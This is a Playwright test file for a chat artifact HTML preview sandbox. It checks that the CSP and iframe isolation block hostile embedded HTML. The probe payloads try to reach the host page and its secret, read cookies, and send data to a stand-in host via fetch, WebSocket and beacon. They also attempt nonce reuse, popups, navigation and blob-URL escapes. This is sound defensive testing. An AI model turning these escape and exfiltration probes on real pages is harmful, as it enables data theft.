import { expect, test, type Page } from '@playwright/test';
import { buildHtmlPreviewDocument } from '../../src/components/chat/artifact-panel/InteractiveHtmlPreview';

const nonce = 'browser-preview-nonce-12345';
const scriptNonce = 'dHJ1c3RlZC1hcHAtbm9uY2UtMTIzNDU=';
// Production proxy.ts policy, including inherited nonce/strict-dynamic.
const parentCsp = [
  "default-src 'self'",
  "base-uri 'self'",
  "object-src 'none'",
  "frame-src 'self' blob:",
  "frame-ancestors 'none'",
  "form-action 'self'",
  `script-src 'self' 'nonce-${scriptNonce}' 'strict-dynamic'`,
  "style-src 'self' 'unsafe-inline'",
  "img-src 'self' data: blob: https:",
  "font-src 'self' data:",
  "connect-src 'self' https: wss:",
  "worker-src 'self' blob:",
  'upgrade-insecure-requests',
].join('; ');
async function mount(page: Page, source: string): Promise<string[]> {
  const requests: string[] = [];
  const wrapper = buildHtmlPreviewDocument(source, nonce, scriptNonce);
  await page.route('**/*', (route) => {
    if (route.request().url() === 'http://preview.test/')
      return route.fulfill({
        contentType: 'text/html',
        headers: { 'Content-Security-Policy': parentCsp },
        body: `<!doctype html><h1>Host</h1><script nonce="${scriptNonce}">window.hostSecret='secret';window.events=[];addEventListener('message', e => window.events.push(e.data));</script><iframe id="wrapper" sandbox="allow-scripts" referrerpolicy="no-referrer"></iframe><script nonce="${scriptNonce}">document.querySelector('iframe').srcdoc=${JSON.stringify(wrapper).replace(/</g, '\\u003c')};</script>`,
      });
    requests.push(route.request().url());
    return route.abort();
  });
  await page.goto('http://preview.test/');
  return requests;
}

test('nonce-only CSP runs a calculator while removing inline handlers and external scripts', async ({
  page,
}) => {
  const requests = await mount(
    page,
    `<input id="a" value="3"><input id="b" value="4"><button id="sum" onclick="document.body.dataset.inline='ran'">Add</button><output id="result"></output><script src="https://probe.test/external.js"></script><script>document.querySelector('#sum').addEventListener('click',()=>{document.querySelector('#result').textContent=Number(document.querySelector('#a').value)+Number(document.querySelector('#b').value)});</script>`
  );
  const inner = page.frameLocator('#wrapper').frameLocator('iframe');
  await inner.getByRole('button', { name: 'Add' }).click();
  await expect(inner.locator('output')).toHaveText('7');
  expect(await inner.locator('body').getAttribute('data-inline')).toBeNull();
  expect(requests).toEqual([]);
  const wrapper = page.frames().find((frame) => frame.url() === 'about:srcdoc');
  expect(
    await wrapper?.evaluate(() => document.querySelector('script')?.nonce)
  ).toBe(scriptNonce);
  expect(
    await wrapper?.evaluate(() =>
      document.querySelector('meta')?.getAttribute('content')
    )
  ).toContain(`script-src 'nonce-${scriptNonce}'`);
});

test('opaque HTML cannot access host, cookies, network, forms, popups, top navigation or workers', async ({
  page,
}) => {
  const violations: string[] = [];
  page.on('console', (message) => violations.push(message.text()));
  const requests = await mount(
    page,
    `<button id="probe">Probe</button><output></output><script>
    document.querySelector('button').addEventListener('click',async()=>{
      const blocked=[];
      for(const [key,fn] of [['parent',()=>parent.document],['top',()=>top.hostSecret],['cookie',()=>document.cookie],['worker',()=>new Worker('https://probe.test/worker')],['topNavigation',()=>top.location='https://probe.test/top']]) {try {fn()}catch {blocked.push(key)}}
      try {await fetch('https://probe.test/fetch')}catch {blocked.push('fetch')}
      await new Promise(resolve => {const socket = new WebSocket('wss://probe.test/socket'); socket.onerror = () => {blocked.push('socket');resolve(null)};});
      try {navigator.sendBeacon('https://probe.test/beacon','x')}catch {blocked.push('beacon')}
      const img=new Image();img.src='https://probe.test/image';document.body.append(img);
      const script=document.createElement('script');script.nonce='${scriptNonce}';script.src='https://probe.test/copied-nonce.js';document.head.append(script);
      const form=document.createElement('form');form.action='https://probe.test/form';document.body.append(form);form.submit();
      const child=document.createElement('iframe');child.src='https://probe.test/frame';document.body.append(child);
      const popup=window.open('https://probe.test/popup'); if(!popup) blocked.push('popup');
      if(!navigator.serviceWorker) blocked.push('serviceWorker');
      document.querySelector('output').textContent=blocked.join(',');
    });
  </script>`
  );
  const inner = page.frameLocator('#wrapper').frameLocator('iframe');
  await inner.getByRole('button', { name: 'Probe' }).click();
  await expect(inner.locator('output')).toContainText('fetch');
  const blocked = (await inner.locator('output').textContent())?.split(',');
  expect(blocked).toEqual(
    expect.arrayContaining([
      'parent',
      'top',
      'cookie',
      'worker',
      'socket',
      'topNavigation',
      'fetch',
      'popup',
      'serviceWorker',
    ])
  );
  expect(requests).toEqual([]);
  expect(
    violations.some(
      (message) =>
        message.includes('wss://probe.test/socket') &&
        message.includes('Content Security Policy')
    )
  ).toBe(true);
  expect(page.url()).toBe('http://preview.test/');
  expect(page.context().pages()).toHaveLength(1);
});

test('HTTP self navigation is blocked before a request leaves the frame', async ({
  page,
}) => {
  const requests = await mount(
    page,
    `<button id="http">HTTP</button><button id="blob">Blob</button><script>
    document.querySelector('#http').onclick=()=>{};
    document.querySelector('#http').addEventListener('click',()=>location.href='https://probe.test/self');
    document.querySelector('#blob').addEventListener('click',()=>{
      const code="fetch('https://probe.test/after-blob').catch(()=>document.querySelector('output').textContent='blocked')";
      location.href=URL.createObjectURL(new Blob(['<output>waiting</output><scr'+'ipt nonce="${scriptNonce}">'+code+'</scr'+'ipt>'],{type:'text/html'}));
    });
  </script>`
  );
  const inner = page.frameLocator('#wrapper').frameLocator('iframe');
  await inner.getByRole('button', { name: 'HTTP', exact: true }).click();
  await expect
    .poll(() =>
      page
        .frames()
        .some((frame) => frame.url() === 'chrome-error://chromewebdata/')
    )
    .toBe(true);
  expect(requests).toEqual([]);
});

test('blob self navigation retains inherited network and external script restrictions', async ({
  page,
}) => {
  const requests = await mount(
    page,
    `<button>Blob</button><script>
    document.querySelector('button').addEventListener('click',()=>{
      const code="fetch('https://probe.test/after-blob').catch(()=>document.querySelector('output').textContent='blocked');const script=document.createElement('script');script.nonce='${scriptNonce}';script.src='https://probe.test/after-blob-script';document.head.append(script)";
      location.href=URL.createObjectURL(new Blob(['<output>waiting</output><scr'+'ipt nonce="${scriptNonce}">'+code+'</scr'+'ipt>'],{type:'text/html'}));
    });
  </script>`
  );
  const inner = page.frameLocator('#wrapper').frameLocator('iframe');
  await inner.getByRole('button', { name: 'Blob', exact: true }).click();
  await expect(inner.locator('output')).toHaveText('blocked');
  expect(requests).toEqual([]);
});
